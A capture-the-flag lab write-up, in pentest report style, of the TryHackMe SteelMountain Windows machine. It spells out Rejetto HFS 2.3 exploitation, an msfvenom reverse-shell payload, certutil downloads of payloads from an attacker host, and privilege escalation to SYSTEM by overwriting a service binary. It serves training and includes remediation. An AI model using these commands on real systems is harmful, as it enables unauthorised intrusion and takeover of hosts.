Link: https://tryhackme.com/room/steelmountain

# SteelMountain — OSCP‑Style Write‑up

### 1. Executive Summary

During the engagement of the target machine SteelMountain, the test achieved full compromise: initial access via a vulnerable file‑server (HTTPFileServer 2.3) was followed by privilege escalation to SYSTEM through insecure service permissions. The compromise allowed full control of the host. No mitigation was applied on the target prior to the test. The weakness lies in outdated software and improper service permissions. Immediate remediation is recommended: patch or upgrade the file‑server software, and restrict write permissions on service binaries to administrators only.

### 2. Scope & Methodology

Scope: single Windows host (IP = <target>), no Active Directory, no buffer overflow, only valid network attack vectors.
Methodology: external network scanning → service enumeration → vulnerability identification → exploitation (initial access) → manual privilege escalation → proof of compromise. Tools used: RustScan, Nmap, HTTPFileServer exploit (via Metasploit and manual exploit), PowerUp, WinPEAS, msfvenom, certutil, netcat. All steps were executed from a Kali-based attacker VM.

### 3. Host Summary
```
Service / Port	             |    Version / Info	          |   Vulnerability Identified
-----------------------------|---------------------------------------------------------------------------------------------
HTTP (port 80)	             | Web server — generic	          |   None relevant found
                             |                                |
HTTP‑FileServer (port 8080)	 | Rejetto HTTPFileServer 2.3	  |   Remote code execution / write upload (public exploit)
                             |                                |
Other open ports —	Not used |                                |
```
Compromise path: HTTPFileServer 2.3 → upload shell via exploit → Meterpreter shell as user bill → enumeration with PowerUp/WinPEAS → insecure service permissions → replacement of service binary → escalation to SYSTEM → full control.

### 4. Initial Access

Network scan with RustScan and Nmap identified port 8080 open and running HTTPFileServer.
Manual visit to port 8080 showed the HTTPFileServer welcome page, confirming version 2.3.
A public exploit (from Exploit‑DB) for Rejetto HTTPFileServer 2.3 was leveraged to upload a staged shell. A Meterpreter session was obtained under user bill.
Proof of access: Meterpreter session output: getuid → STEELMOUNTAIN\bill.

### 5. Privilege Escalation

Uploaded PowerUp.ps1 via Meterpreter to the target’s %TEMP% directory.
Ran Invoke-AllChecks → identified a misconfigured service AdvancedSystemCareService9, running as SYSTEM, with weak permissions allowing Restart / AppendData.
Generated a reverse shell executable using msfvenom, named ASCService.exe.
Via Meterpreter upload, replaced the legitimate service binary located under C:\Program Files (x86)\IObit\Advanced SystemCare\ with ASCService.exe.
Used sc stop AdvancedSystemCareService9 and then sc start AdvancedSystemCareService9 to trigger execution — obtaining a SYSTEM shell (netcat listener connected).

### 6. Full Technical Walkthrough (concise)
```
export target=10.10.226.163
rustscan -a $target --ulimit 5000 -- -sC -sV -oA scan
# identified port 8080 – HTTPFileServer 2.3
# visited in browser → confirmed version 2.3  
# exploit via Metasploit / manual exploit → shell as 'bill'  
meterpreter > upload PowerUp.ps1 C:\Users\bill\AppData\Local\Temp\PowerUp.ps1  
meterpreter > powershell_shell  
PS C:\Users\bill\AppData\Local\Temp> . .\PowerUp.ps1; Invoke-AllChecks  
# found vulnerable service 'AdvancedSystemCareService9' with weak permissions  
# exit to shell  
cmd > sc stop AdvancedSystemCareService9  
# generate reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe  
# in attacker machine – host ASCService.exe  
# in Meterpreter – upload ASCService.exe to service path (overwrite)  
cmd > sc start AdvancedSystemCareService9  
# attacker catches reverse shell → SYSTEM privileges  
```

### 7. Findings
```
| ID   | Finding                                                                         | Severity | Impact                                                                    |
| ---- | ------------------------------------------------------------------------------- | -------- | ------------------------------------------------------------------------- |
| F-01 | Outdated HTTPFileServer 2.3 — remote file upload / RCE                          | High     | Full remote code execution as SYSTEM possible (initial access)            |
| F-02 | Service `AdvancedSystemCareService9` with weak permissions (AppendData/Restart) | High     | Local privilege escalation to SYSTEM possible by replacing service binary |
```

### 8. Remediation

For F-01: Immediately update or remove HTTPFileServer 2.3. Use a maintained equivalent or disable service if not needed.
For F-02: Modify permissions on service executable and folder so that only administrators (or SYSTEM) can write or replace the binary. Restrict write/modify access. Use principle of least privilege.
Implement periodic patch management and service permission reviews.
Consider host-based hardening: avoid unnecessary third‑party software like “Advanced SystemCare”, especially outdated versions.

### 9. Conclusion

The target machine was fully compromised using publicly available exploits and a straightforward privilege‑escalation via weak service permissions. The vulnerability chain required no zero‑day and no buffer overflow — only misconfigurations and outdated software. The case demonstrates the effectiveness of combining basic enumeration, public exploits, and privilege‑escalation tools (PowerUp/WinPEAS) to achieve SYSTEM-level compromise. The provided remediation steps significantly reduce risk if applied.

### 10. Appendix A – Proof of Concept (Full Command & Output Log)

Let's begin by exporting the IP as 'target' in the environment variables:
```
export target=10.10.226.163
```
![](https://github.com/user-attachments/assets/d725ed03-afb0-494a-b2b8-affaa7c3391e)

Create a 'SteelMountain' directory and scan the network with rustscan followed by a more precise scan with nmap:
```
rustscan -a $target --ulimit 5000 -- -sC -sV -oA scan
```
![](https://github.com/user-attachments/assets/3cc166e7-a692-4bae-8e1c-89fbbcf55681)

![](https://github.com/user-attachments/assets/ea4285ba-2bc5-4a98-ae95-a6a6dd5777ea)

![](https://github.com/user-attachments/assets/e832bf8f-5ddd-4afe-8f8e-1a9f02d9c342)

As you can see there are many ports open. Let's begin by visiting the website:
![](https://github.com/user-attachments/assets/954cdf5f-cbda-44a5-a240-f505642e9d7c)
By right clicking the image and inspecting it, we can find the name of the employee of the month and answer the first question.

It seems there are no other links or interesting things in this page. Let's try port 8080:
![](https://github.com/user-attachments/assets/60631de5-5140-4971-9046-a49c0ac4e582)
In the lower-left corner of the screen you can see the name and version of the file server. Doing a quick research on google we can see it is a Rejetto HttpFileServer 2.3.

First we will exploit this using Metasploit. Let's fire it up and search for rejetto exploits:
![](https://github.com/user-attachments/assets/54502ade-ccaa-4674-9598-39aef6bdf409)
We will use the 2014 one: `use 1`.

Now let's configure the options:
```
show options
```
```
set RHOSTS <target IP>
set RPORT 8080
set LHOST <local IP>
```
We can leave the LPORT to 4444 and hit `run`.
![](https://github.com/user-attachments/assets/8883396f-88a0-40e4-80b4-1a02c548e4b7)
A session was obtained successfully with user bill. 
```
getuid:
STEELMOUNTAIN\bill
```

Now we will use the `upload` functionality of meterpreter to upload `PowerUp.ps1` in the `%TEMP%` folder:
![](https://github.com/user-attachments/assets/928397a9-fd95-4ee7-a4a5-ec8a8f4c544c)

It's time to fire up PowerUp.ps1 to do some enumeration:
```
load powershell
powershell_shell
. .\PowerUp.ps1
Invoke-AllChecks
```
![](https://github.com/user-attachments/assets/16778245-36ec-4fc0-9877-7ed4e9bd9b7f)

The first entry is what we need.
An Advanced SystemCare9 service that we `CanRestart : True` with `AppendData` permissions, running as `LocalSystem` to escalate our privileges.
`PowerUp.ps1` is flagging us an unquoted service path vulnerability as well, but we will focus on the insecure service permissions one.

What we need now is to enter cmd `shell` to `sc stop AdvancedSystemCareService9` to upload the msfvenom shell we will create now in another terminal in our kali attacker, named as the executable `ASCService.exe`:
```
msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```
![](https://github.com/user-attachments/assets/e11027f6-b3db-47f2-b603-4ec01efbcd2e)

![](https://github.com/user-attachments/assets/5f701340-d0eb-42cc-8190-32116130314c)

We will now move to the folder of the service's executable `C:\Program Files (x86)\IObit\Advanced Systemcare\` and go back to meterpreter to upload our shell. 
The upload function of meterpreter will automatically overwrite the file.
![](https://github.com/user-attachments/assets/966063c5-22f4-431f-addc-29eac14ca34b)

Now it's time to fire up netcat `nc -lvnp 4445` and start the service:
![](https://github.com/user-attachments/assets/443f4d1d-f558-42c5-a74e-45c764be9d02)

The service will probably crash but we will have triggered our payload.
Local privilege escalation was achieved via a vulnerable service running as SYSTEM.
![](https://github.com/user-attachments/assets/048828a9-c5d4-4cbc-a0b7-5dfa5e0c3970)


Now we will redo all the phases of this box without automatic exploitation.

We will begin by searching for an exploit in the exploitdb:
```
searchploit rejetto
```
![](https://github.com/user-attachments/assets/c78ac923-a65a-4b91-a7d7-acaff97ef817)

We will use the 39161.py one. Let's download it:
```
searchsploit -p windows/remote/39161.py
```
![](https://github.com/user-attachments/assets/f95e68c9-9f97-4865-b832-184ec411b25c)
In the exploit we only need to change the IP and the LPORT to make it work.

In another terminal we will open a server hosting a `netcat.exe` file named as `nc.exe`
and open an `nc` listener on another one.
We need to run this script twice, one to upload the `nc.exe` file and one to establish the connection.
The script needs too be executed in python2.

First run:
![](https://github.com/user-attachments/assets/71d00b6e-c8a3-4aa2-8762-6f88d6b7e9dd)

Second run:
![](https://github.com/user-attachments/assets/f1ca4ff2-63b1-4b8f-ac92-5cb07ad0a277)

Now that we're in, we will upload `winpeas` to do some enumeration:
We will again open a server hosting the file and use `certutil` to download it:
```
certutil -f -split -urlcache http://<IP>:<PORT>/winPEASany.exe winPEAS.exe
```
![](https://github.com/user-attachments/assets/7c432bc9-ffba-4a47-9314-d996eb3d1f1d)

Now it's time to fire it up:
```
.\winPEAS.exe servicesinfo
```
![](https://github.com/user-attachments/assets/d8a33f37-e2da-4b5c-9fea-c98b3047c7b1)
And as predicted, winpeas found our ASC privesc vuln.

Now we will use `certutil` again to download and substitute the original ASCService.exe with our payload, after we have stopped the service:
```
sc stop AdvancedSystemCareService9
```
![](https://github.com/user-attachments/assets/1fd7e1ac-05a2-4f1d-ad3a-4db7a64d9a0d)

```
certutil -f -split -urlcache http://<IP>:<PORT>/ASCService.exe ASCService.exe
```
![](https://github.com/user-attachments/assets/cc6d0c75-c85d-41ee-be42-c521a5e6e027)

In another terminal, fire up `nc -lvnp <PORT>` and by restarting the service we will have escalate to NT AUTHORITY/SYSTEM privileges, this time with manual exploitation. 
```
sc start AdvancedSystemCareService9
```
![](https://github.com/user-attachments/assets/2137f4d2-deaf-4dc7-aff2-679940aca053)

![](https://github.com/user-attachments/assets/5bfb89be-31aa-485c-a284-d536c751b012)

